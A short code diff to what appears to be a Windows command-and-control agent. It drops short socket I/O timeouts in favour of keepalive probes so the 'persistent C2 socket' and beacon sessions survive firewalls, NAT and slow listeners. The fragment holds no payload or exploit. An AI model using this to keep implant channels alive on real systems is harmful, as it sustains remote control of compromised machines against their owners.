@@ -64,17 +64,17 @@ static void tcp_reset(void) {
 /* Configure the persistent C2 socket so an idle connection is probed instead
  * of being silently discarded by a firewall/NAT.  Keep the normal socket
  * options as a fallback because some Windows environments reject the extended
- * keepalive ioctl. */
+ * keepalive ioctl.
+ *
+ * Do not install a short SO_RCVTIMEO/SO_SNDTIMEO here.  This socket is also
+ * used for the request/response beacon protocol, and a 10-second I/O timeout
+ * is shorter than the listener's deadline.  A delayed response would make the
+ * agent reset an otherwise healthy session; the keepalive probes handle idle
+ * peer detection instead. */
 static void tcp_configure_socket(SOCKET s) {
     BOOL keepalive = TRUE;
     setsockopt(s, SOL_SOCKET, SO_KEEPALIVE,
                (const char*)&keepalive, sizeof(keepalive));
-
-    DWORD timeout_ms = 10000;
-    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO,
-               (const char*)&timeout_ms, sizeof(timeout_ms));
-    setsockopt(s, SOL_SOCKET, SO_SNDTIMEO,
-               (const char*)&timeout_ms, sizeof(timeout_ms));
 
     // MinGW exposes this layout as struct tcp_keepalive while MSVC exposes
     // the typedef tcp_keepalive. Keep the three DWORD fields local so both
